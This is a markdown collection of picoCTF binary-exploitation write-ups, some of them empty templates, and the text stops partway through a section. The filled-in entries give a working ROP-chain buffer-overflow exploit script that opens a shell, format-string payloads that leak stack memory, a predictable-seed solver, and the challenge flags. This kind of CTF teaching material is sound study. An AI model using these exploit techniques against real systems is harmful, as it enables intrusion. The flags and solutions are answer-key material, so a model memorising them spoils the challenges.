# [PicoCTF](./picoctf.md) Binary Exploitation [13/37]

Binary exploitation is the process of subverting a compiled application such that it violates some trust boundary in a way that is advantageous to you, the attacker.

## Contents

- [seed-sPRiNG (2019)](#seed-spring) 🗸
- [sice_cream (2019)](#sice-cream)
- [zero_to_hero (2019)](#zero-to-hero)
- [messy-malloc (2019)](#messy-malloc)
- [Guessing Game 1 (2020)](#guessing-game-1) 🗸
- [Guessing Game 2 (2020)](#guessing-game-2)
- [Stonks (2021)](#stonks) 🗸
- [Cache Me Outside (2021)](#cache-me-outside)
- [Here's a LIBC (2021)](#heres-a-libc)
- [Unsubscriptions Are Free (2021)](#unsubscriptions-are-free)
- [filtered-shellcode (2021)](#filtered-shellcode)
- [Kit Engine (2021)](#kit-engine)
- [Stonk Market (2021)](#stonk-market)
- [Download Horsepower (2021)](#download-horsepower)
- [The Office (2021)](#the-office)
- [Turboflan (2021)](#turboflan)
- [Bizz Fuzz (2021)](#bizz-fuzz)
- [cutter-overflow (2021)](#cutter-overflow) 🗸
- [fermat-strings (2021)](#fermat-strings)
- [SaaS (2021)](#saas)
- [homework (2021)](#homework)
- [lockdown-horses (2021)](#lockdown-horses)
- [vr-school (2021)](#vr-school)
- [basic-file-exploit (2022)](#basic-file-exploit) 🗸
- [buffer overflow 0 (2022)](#buffer-overflow-0) 🗸
- [CVE-XXXX-XXXX (2022)](#cve-xxxx-xxxx) 🗸
- [buffer overflow 1 (2022)](#buffer-overflow-1) 🗸
- [RPS (2022)](#rps) 🗸
- [x-sixty-what (2022)](#x-sixty-what) 🗸
- [buffer overflow 2 (2022)](#buffer-overflow-2) 🗸
- [buffer overflow 3 (2022)](#buffer-overflow-3) 🗸
- [flag leak (2022)](#flag-leak) 🗸
- [ropfu (2022)](#ropfu)
- [wine (2022)](#wine)
- [function overwrite (2022)](#function-overwrite)
- [stack cache (2022)](#stack-cache)
- [solfire (2022)](#solfire)

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## seed sPRiNG

- Author: John Hammond
- 350 Points

### Description

The most revolutionary game is finally available: [seed sPRiNG](https://jupiter.challenges.picoctf.org/static/d14dfdcce1c354fcf646e1b7faaab89a/seed_spring) is open right now! seed_spring. Connect to it with nc jupiter.challenges.picoctf.org 34558.

### Hints

1. How is that program deciding what the height is?
2. You and the program should sync up!

### Attachments

1. [seed_spring](https://jupiter.challenges.picoctf.org/static/d14dfdcce1c354fcf646e1b7faaab89a/seed_spring)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can connect to the challenge server and are asked for the "height":

~~~shell
$ nc jupiter.challenges.picoctf.org 34558


                                                                             
                          #                mmmmm  mmmmm    "    mm   m   mmm 
  mmm    mmm    mmm    mmm#          mmm   #   "# #   "# mmm    #"m  # m"   "
 #   "  #"  #  #"  #  #" "#         #   "  #mmm#" #mmmm"   #    # #m # #   mm
  """m  #""""  #""""  #   #          """m  #      #   "m   #    #  # # #    #
 "mmm"  "#mm"  "#mm"  "#m##         "mmm"  #      #    " mm#mm  #   ##  "mmm"
                                                                             


Welcome! The game is easy: you jump on a sPRiNG.
How high will you fly?

LEVEL (1/30)

Guess the height: 1
WRONG! Sorry, better luck next time!
exit
~~~

We can decompile the program in Ghidra and find the main function:

~~~shell
undefined4 main(undefined param_1)

{
  uint local_20;
  uint local_1c;
  uint local_18;
  int local_14;
  undefined *local_10;
  
  local_10 = &param_1;
  puts("");
  puts("");
  puts("                                                                             ");
  puts("                          #                mmmmm  mmmmm    \"    mm   m   mmm ");
  puts("  mmm    mmm    mmm    mmm#          mmm   #   \"# #   \"# mmm    #\"m  # m\"   \"");
  puts(" #   \"  #\"  #  #\"  #  #\" \"#         #   \"  #mmm#\" #mmmm\"   #    # #m # #   mm");
  puts(
      "  \"\"\"m  #\"\"\"\"  #\"\"\"\"  #   #          \"\"\"m  #      #   \"m   #    #  # # #    #"
      );
  puts(" \"mmm\"  \"#mm\"  \"#mm\"  \"#m##         \"mmm\"  #      #    \" mm#mm  #   ##  \"mmm\"");
  puts("                                                                             ");
  puts("");
  puts("");
  puts("Welcome! The game is easy: you jump on a sPRiNG.");
  puts("How high will you fly?");
  puts("");
  fflush(stdout);
  local_18 = time((time_t *)0x0);
  srand(local_18);
  local_14 = 1;
  while( true ) {
    if (0x1e < local_14) {
      puts("Congratulation! You\'ve won! Here is your flag:\n");
      fflush(stdout);
      get_flag();
      fflush(stdout);
      return 0;
    }
    printf("LEVEL (%d/30)\n",local_14);
    puts("");
    local_1c = rand();
    local_1c = local_1c & 0xf;
    printf("Guess the height: ");
    fflush(stdout);
    __isoc99_scanf(&DAT_00010caa,&local_20);
    fflush(stdin);
    if (local_1c != local_20) break;
    local_14 = local_14 + 1;
  }
  puts("WRONG! Sorry, better luck next time!");
  fflush(stdout);
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
~~~

We can see the main program generates a random number seeded from the time:

~~~c
  local_18 = time((time_t *)0x0);
  srand(local_18);
  ...
  local_1c = rand();
~~~
	
Using the same seed and call, we can generate a random number to solve the program:
		
~~~c
#include <stdio.h> 
#include <time.h>
#include <stdlib.h> 
  
int main () 
{ 
    local_18 = time(0);
    srand(local_18);
    
    for (int i = 0; i < 30; i++)
    {
        local_1c = rand()&0xf
        printf("%d\n", local_1c); 
    }
      
    return 0; 
} 
~~~

We can compile and pipe this into the challenge executable:

~~~shell
$ gcc seed_spring_solver.c -o seed_spring_solver
$ chmod +x seed_spring
$ chmod +x seed_spring_solver 
$ ./seed_spring_solver | ./seed_spring


                                                                             
                          #                mmmmm  mmmmm    "    mm   m   mmm 
  mmm    mmm    mmm    mmm#          mmm   #   "# #   "# mmm    #"m  # m"   "
 #   "  #"  #  #"  #  #" "#         #   "  #mmm#" #mmmm"   #    # #m # #   mm
  """m  #""""  #""""  #   #          """m  #      #   "m   #    #  # # #    #
 "mmm"  "#mm"  "#mm"  "#m##         "mmm"  #      #    " mm#mm  #   ##  "mmm"
                                                                             


Welcome! The game is easy: you jump on a sPRiNG.
How high will you fly?

LEVEL (1/30)

Guess the height: LEVEL (2/30)

Guess the height: LEVEL (3/30)

Guess the height: LEVEL (4/30)

Guess the height: LEVEL (5/30)

Guess the height: LEVEL (6/30)

Guess the height: LEVEL (7/30)

Guess the height: LEVEL (8/30)

Guess the height: LEVEL (9/30)

Guess the height: LEVEL (10/30)

Guess the height: LEVEL (11/30)

Guess the height: LEVEL (12/30)

Guess the height: LEVEL (13/30)

Guess the height: LEVEL (14/30)

Guess the height: LEVEL (15/30)

Guess the height: LEVEL (16/30)

Guess the height: LEVEL (17/30)

Guess the height: LEVEL (18/30)

Guess the height: LEVEL (19/30)

Guess the height: LEVEL (20/30)

Guess the height: LEVEL (21/30)

Guess the height: LEVEL (22/30)

Guess the height: LEVEL (23/30)

Guess the height: LEVEL (24/30)

Guess the height: LEVEL (25/30)

Guess the height: LEVEL (26/30)

Guess the height: LEVEL (27/30)

Guess the height: LEVEL (28/30)

Guess the height: LEVEL (29/30)

Guess the height: LEVEL (30/30)

Guess the height: Congratulation! You've won! Here is your flag:


cat: flag.txt: No such file or directory

~~~

This provides the correct output.  We can pipe to netcat to retrieve the flag:

~~~shell
$ ./seed_spring_solver | nc jupiter.challenges.picoctf.org 34558


                                                                             
                          #                mmmmm  mmmmm    "    mm   m   mmm 
  mmm    mmm    mmm    mmm#          mmm   #   "# #   "# mmm    #"m  # m"   "
 #   "  #"  #  #"  #  #" "#         #   "  #mmm#" #mmmm"   #    # #m # #   mm
  """m  #""""  #""""  #   #          """m  #      #   "m   #    #  # # #    #
 "mmm"  "#mm"  "#mm"  "#m##         "mmm"  #      #    " mm#mm  #   ##  "mmm"
                                                                             


Welcome! The game is easy: you jump on a sPRiNG.
How high will you fly?

LEVEL (1/30)

Guess the height: LEVEL (2/30)

Guess the height: LEVEL (3/30)

Guess the height: LEVEL (4/30)

Guess the height: LEVEL (5/30)

Guess the height: LEVEL (6/30)

Guess the height: LEVEL (7/30)

Guess the height: LEVEL (8/30)

Guess the height: LEVEL (9/30)

Guess the height: LEVEL (10/30)

Guess the height: LEVEL (11/30)

Guess the height: LEVEL (12/30)

Guess the height: LEVEL (13/30)

Guess the height: LEVEL (14/30)

Guess the height: LEVEL (15/30)

Guess the height: LEVEL (16/30)

Guess the height: LEVEL (17/30)

Guess the height: LEVEL (18/30)

Guess the height: LEVEL (19/30)

Guess the height: LEVEL (20/30)

Guess the height: LEVEL (21/30)

Guess the height: LEVEL (22/30)

Guess the height: LEVEL (23/30)

Guess the height: LEVEL (24/30)

Guess the height: LEVEL (25/30)

Guess the height: LEVEL (26/30)

Guess the height: LEVEL (27/30)

Guess the height: LEVEL (28/30)

Guess the height: LEVEL (29/30)

Guess the height: LEVEL (30/30)

Guess the height: Congratulation! You've won! Here is your flag:

picoCTF{pseudo_random_number_generator_not_so_random_81b0dd7e}
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{pseudo_random_number_generator_not_so_random_81b0dd7e}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## sice cream

- Author: Samuel
- 500 Points

### Description

Just pwn this [program](https://jupiter.challenges.picoctf.org/static/4e1ec7c33a9e2ee08204289db0cd66f7/sice_cream) and get a flag. Connect with nc jupiter.challenges.picoctf.org 39673. [libc.so.6](https://jupiter.challenges.picoctf.org/static/4e1ec7c33a9e2ee08204289db0cd66f7/libc.so.6) [ld-2.23.so](https://jupiter.challenges.picoctf.org/static/4e1ec7c33a9e2ee08204289db0cd66f7/ld-2.23.so).

### Hints

1. Make sure to both files are in the same directory as the executable, and set LD_PRELOAD to the path of libc.so.6

### Attachments

1. [program](https://jupiter.challenges.picoctf.org/static/4e1ec7c33a9e2ee08204289db0cd66f7/sice_cream)
2. [libc.so.6](https://jupiter.challenges.picoctf.org/static/4e1ec7c33a9e2ee08204289db0cd66f7/libc.so.6)
3. [ld-2.23.so](https://jupiter.challenges.picoctf.org/static/4e1ec7c33a9e2ee08204289db0cd66f7/ld-2.23.so)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## zero to hero

- Author: Claude
- 500 Points

### Description

Now you're really cooking. Can you pwn [this](https://jupiter.challenges.picoctf.org/static/47665fca2626cb9919a1fd221c6a5ccb/zero_to_hero) service?. Connect with nc jupiter.challenges.picoctf.org 22056. [libc.so.6](https://jupiter.challenges.picoctf.org/static/47665fca2626cb9919a1fd221c6a5ccb/libc.so.6) [ld-2.29.so](https://jupiter.challenges.picoctf.org/static/47665fca2626cb9919a1fd221c6a5ccb/ld-2.29.so).

### Hints

1. Make sure to both files are in the same directory as the executable, and set LD_PRELOAD to the path of libc.so.6

### Attachments

1. [zero_to_hero](https://jupiter.challenges.picoctf.org/static/47665fca2626cb9919a1fd221c6a5ccb/zero_to_hero)
2. [libc.so.6](https://jupiter.challenges.picoctf.org/static/47665fca2626cb9919a1fd221c6a5ccb/libc.so.6)
3. [ld-2.29.so](https://jupiter.challenges.picoctf.org/static/47665fca2626cb9919a1fd221c6a5ccb/ld-2.29.so)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## guessing game 1

- Author: madStacks
-  Points

### Description

I made a simple game to show off my programming skills. See if you can beat it! [vuln](https://jupiter.challenges.picoctf.org/static/3087c07bcba6f4ca29aa2dffab66c19f/vuln) [vuln.c](https://jupiter.challenges.picoctf.org/static/3087c07bcba6f4ca29aa2dffab66c19f/vuln.c) [Makefile](https://jupiter.challenges.picoctf.org/static/3087c07bcba6f4ca29aa2dffab66c19f/Makefile) nc jupiter.challenges.picoctf.org 28953

### Hints

1. Tools can be helpful, but you may need to look around for yourself.
2. Remember, in CTF problems, if something seems weird it probably means something...

### Attachments

1. [vuln](https://jupiter.challenges.picoctf.org/static/3087c07bcba6f4ca29aa2dffab66c19f/vuln)
2. [vuln.c](https://jupiter.challenges.picoctf.org/static/3087c07bcba6f4ca29aa2dffab66c19f/vuln.c)
3. [Makefile](https://jupiter.challenges.picoctf.org/static/3087c07bcba6f4ca29aa2dffab66c19f/Makefile)

### Solutions

<details>

<summary markdown="span">Solution</summary>

Reviewing the source code we can see a program that receives a user input, compares to a "random" number and processes a win or a loss:
	
~~~c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100


long increment(long in) {
	return in + 1;
}

long get_random() {
	return rand() % BUFSIZE;
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n\n");
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
~~~

We can decompile the vuln binary in ghidra to find the two registers used for the comparison:

~~~
undefined8        Stack[-0x18]:8 local_18                                XREF[4]:     00400bac(W), 
...
00400c14 48 3b 45 f0     CMP        RAX,qword ptr [RBP + local_18]
~~~

Running in gdb, we can set a breakpoint at atol to review the registers:

~~~
$ chmod +x vuln
$ gdb vuln
(gdb) b atol
Breakpoint 1 at 0x40dd60
(gdb) r
Starting program: /home/derek/Downloads/vuln 
Welcome to my guessing game!

What number would you like to guess?
1

Breakpoint 1, 0x000000000040dd60 in atol ()
~~~

At this breakpoint we can find the regsiters with our input and the register of the random number:

~~~
(gdb) x/s $rdi
0x7fffffffd5a0:	"1\n"
(gdb) x/s $rax
0x7fffffffd5a0:	"1\n"
(gdb) x/s $rbp - 0x18 + 8
0x7fffffffd610:	"T"
~~~

rerunning we get the same random number.  continuing after the breakpoint, the random number changes.  After investigating, the random number appears to step through the following integers:

~~~
84
87
78
16
94
36
...
~~~

Using this we can get to the win() function:

~~~
(gdb) c
Continuing.
Congrats! You win! Your prize is this print statement!

New winner!
Name? 
~~~

Reviewing the source code we can see the fgets accepts up to 360 bytes but the variable buffer only holds 100 bytes.  We can therefore inject a buffer overflow. We can generate a ROP chain using ROPgadget detailed below:

| Detail       | Payload                            |
|--------------|------------------------------------|
| Offset       | 120 chars                          |
| POP $RAX     | '\xf4\x63\x41\x00\x00\x00\x00\x00' |
| Syscall      | '\x2f\x62\x69\x6e\x2f\x73\x68\x00' |
| POP $RSI     | '\xa3\x0c\x41\x00\x00\x00\x00\x00' |
| DATA Add     | '\xa0\xc3\x6b\x00\x00\x00\x00\x00' |
| $RSI - $RAX  | '\x91\xff\x47\x00\x00\x00\x00\x00' |
| POP $RAX     | '\xf4\x63\x41\x00\x00\x00\x00\x00' |
| Execv        | '\x3b\x00\x00\x00\x00\x00\x00\x00' |
| POP $RDI     | '\x96\x06\x40\x00\x00\x00\x00\x00' |
| DATA Add     | '\xa0\xc3\x6b\x00\x00\x00\x00\x00' |
| POP $RSI     | '\xa3\x0c\x41\x00\x00\x00\x00\x00' |
| NULL         | '\x00\x00\x00\x00\x00\x00\x00\x00' |
| POP $RDX     | '\xb5\xa6\x44\x00\x00\x00\x00\x00' |
| NULL         | '\x00\x00\x00\x00\x00\x00\x00\x00' |
| Syscall      | '\x7c\x13\x40\x00\x00\x00\x00\x00' |
|--------------|------------------------------------|

We can put this together in Python to exploit the challenge server:

~~~py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Jan 30 13:21:06 2022

@author: derek
"""

from pwn import *
import socket
import time

payload = b"a"*120
payload += b'\xf4\x63\x41\x00\x00\x00\x00\x00'
payload += b'\x68\x73\x2f\x6e\x69\x62\x2f\x00'
payload += b'\xa3\x0c\x41\x00\x00\x00\x00\x00'
payload += b'\xa0\xc3\x6b\x00\x00\x00\x00\x00'
payload += b'\x91\xff\x47\x00\x00\x00\x00\x00'
payload += b'\xf4\x63\x41\x00\x00\x00\x00\x00'
payload += b'\x3b\x00\x00\x00\x00\x00\x00\x00'
payload += b'\x96\x06\x40\x00\x00\x00\x00\x00'
payload += b'\xa0\xc3\x6b\x00\x00\x00\x00\x00'
payload += b'\xa3\x0c\x41\x00\x00\x00\x00\x00'
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'
payload += b'\xb5\xa6\x44\x00\x00\x00\x00\x00'
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'
payload += b'\x7c\x13\x40\x00\x00\x00\x00\x00'

URL = "jupiter.challenges.picoctf.org"
PORT = 28953

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((URL, PORT))
print("connected to challenge server")
time.sleep(1)
recvbuff = s.recv(1000).decode()
print(recvbuff)
s.send(b"84\n")
time.sleep(1)
recvbuff = s.recv(1000).decode()
print(recvbuff)
s.send(payload + b"\n")
time.sleep(1)
recvbuff = s.recv(1000)
print(recvbuff)
s.send(b"ls\n")
time.sleep(1)
recvbuff = s.recv(1000)
print(recvbuff)
s.send(b"cat flag.txt\n")
time.sleep(1)
recvbuff = s.recv(1000)
print(recvbuff)
~~~

This returns the flag.
	
</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b30e66e722f3f0d0}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## guessing game 2

- Author:
-  Points

### Description

### Hints

### Attachments

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

solution details

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## stonks

- Author: madStacks
- 20 Points

### Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) nc mercury.picoctf.net 33411

### Hints

1. Okay, maybe I'd believe you if you find my API key.

### Attachments

1. [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c)

<details>

<summary markdown="span">vuln.c</summary>

~~~c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date"); // TODO: implement this in C
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head) {
		printf("You don't own any stonks!\n");
	}
	while (head) {
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares < 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk->shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i <= MAX_SYM_LEN; i++) {
		if (i < AI_symbol_len) {
			stonk->symbol[i] = 'A' + (rand() % 26);
		} else {
			stonk->symbol[i] = '\0';
		}
	}

	stonk->next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p->money = (rand() % 2018) + 1;
	p->head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p->head;
	Stonk *next = NULL;
	while (current) {
		next = current->next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}
~~~

</details>

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Reviewing the source code, it can be seen that the flag is opened and stored in api_buf:

~~~c
char api_buf[FLAG_BUFFER];
FILE *f = fopen("api","r");
if (!f) {
  printf("Flag file not found. Contact an admin.\n");
  exit(1);
}
fgets(api_buf, FLAG_BUFFER, f);
~~~
	
The source code shows an obvious format string vulnerability in the buy_stonks function:
	
~~~c
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
~~~

We can use a pointer to see if this vulnerability is present:

~~~shell
$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x
Buying stonks with token:
84f53f0
Portfolio as of Sun Jan 16 18:26:48 UTC 2022


1 shares of X
14 shares of M
1 shares of WSLH
130 shares of OVFC
Goodbye!
~~~

This returns the value 84f53f0 which is the value at the top of the stack.  The input %x.%x...%x.%x will pop the number of "%x" stack values and print them.  Re-running the program with lots of "%x." can return the stack:
	
~~~shell
$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Buying stonks with token:
9d273b0.804b000.80489c3.f7f6bd80.ffffffff.1.9d25160.f7f79110.f7f6bdc7.0.9d26180.4.9d27390.9d273b0.6f636970.7b465443.306c5f49.345f7435.6d5f6c6c.306d5f79.5f79336e.63343261.36613431.fff7007d.f7fa6af8.f7f79440.550fb100.1.0.f7e08be9.f7f7a0c0.f7f6b5c0.f7f6b000.fff7c628.f7df958d.f7f6b5c0.8048eca.fff7c634.0.f7f8df09.804b000.f7f6b000.f7f6be20.fff7c668.f7f93d50.f7f6c890.550fb100.f7f6b000.804b000.fff7c668.8048c86.9d25160.fff7c654.fff7c668.8048be9.f7f6b3fc.0.fff7c71c.fff7c714.1.1.9d25160.550fb100.fff7c680.0.0.f7daef21.f7f6b000.f7f6b000.0.f7daef21.1.fff7c714.fff7c71c.fff7c6a4.1.0.f7f6b000.f7f8e70a.f7fa6000.0.f7f6b000.0.0.243ba1c2.7e6b67d2.0.0.0.1.8048630.0.f7f93d50.f7f8e960.804b000.1.8048630.0.8048662.8048b85.
Portfolio as of Sun Jan 16 18:46:11 UTC 2022


4 shares of HR
89 shares of UMEM
133 shares of GSXU
442 shares of SBPJ
492 shares of C
695 shares of KK
Goodbye!
~~~

The 15th item in the stack appears to be ASCII (6f636970).  We can take the ASCII encoded hex bytes from the 15th point in the stack using:

~~~
%15$llx.%16$llx.%17$llx.%18$llx.%19$llx
~~~

This returns:

~~~
7b4654436f636970.345f7435306c5f49.306d5f796d5f6c6c.633432615f79336e.ffd1007d36613431
~~~

which we can use Python to recover the flag:
	
~~~py
import binascii
a = "7b4654436f636970.345f7435306c5f49.306d5f796d5f6c6c.633432615f79336e.ffd1007d36613431"
b = a.split(".")
flag= ""
for i in range(len(b)):
    buffer = binascii.unhexlify(b[i].encode())[::-1]
    for j in range(len(buffer)):
        try:
            flag += chr(buffer[j])
        except:
            continue
print(flag)
~~~
	
This returns the flag.
	
</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## cache me outside

- Author: madStacks
- 70 Points

### Description

While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. nc mercury.picoctf.net 36605 [heapedit](https://mercury.picoctf.net/static/482492895851479e0da770f2892e2677/heapedit) [Makefile](https://mercury.picoctf.net/static/482492895851479e0da770f2892e2677/Makefile) [libc.so.6](https://mercury.picoctf.net/static/482492895851479e0da770f2892e2677/libc.so.6)

### Hints

1. It may be helpful to read a little bit on GLIBC's tcache.

### Attachments

1. [heapedit](https://mercury.picoctf.net/static/482492895851479e0da770f2892e2677/heapedit)
2. [Makefile](https://mercury.picoctf.net/static/482492895851479e0da770f2892e2677/Makefile)
3. [libc.so.6](https://mercury.picoctf.net/static/482492895851479e0da770f2892e2677/libc.so.6)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

The headpedit executable can be decompiled in ghidra:
	
~~~c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined local_a9;
  int local_a8;
  int local_a4;
  undefined8 *local_a0;
  undefined8 *local_98;
  FILE *local_90;
  undefined8 *local_88;
  void *local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined local_60;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  local_90 = fopen("flag.txt","r");
  fgets(local_58,0x40,local_90);
  local_78 = 0x2073692073696874;
  local_70 = 0x6d6f646e61722061;
  local_68 = 0x2e676e6972747320;
  local_60 = 0;
  local_a0 = (undefined8 *)0x0;
  for (local_a4 = 0; local_a4 < 7; local_a4 = local_a4 + 1) {
    local_98 = (undefined8 *)malloc(0x80);
    if (local_a0 == (undefined8 *)0x0) {
      local_a0 = local_98;
    }
    *local_98 = 0x73746172676e6f43;
    local_98[1] = 0x662072756f592021;
    local_98[2] = 0x203a73692067616c;
    *(undefined *)(local_98 + 3) = 0;
    strcat((char *)local_98,local_58);
  }
  local_88 = (undefined8 *)malloc(0x80);
  *local_88 = 0x5420217972726f53;
  local_88[1] = 0x276e6f7720736968;
  local_88[2] = 0x7920706c65682074;
  *(undefined4 *)(local_88 + 3) = 0x203a756f;
  *(undefined *)((long)local_88 + 0x1c) = 0;
  strcat((char *)local_88,(char *)&local_78);
  free(local_98);
  free(local_88);
  local_a8 = 0;
  local_a9 = 0;
  puts("You may edit one byte in the program.");
  printf("Address: ");
  __isoc99_scanf(&DAT_00400b48,&local_a8);
  printf("Value: ");
  __isoc99_scanf(&DAT_00400b53,&local_a9);
  *(undefined *)((long)local_a8 + (long)local_a0) = local_a9;
  local_80 = malloc(0x80);
  puts((char *)((long)local_80 + 0x10));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
~~~
				  
This shows the program is manipulating memory addresses.  There is a prompt to change 1 byte of memory to try and print the flag.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
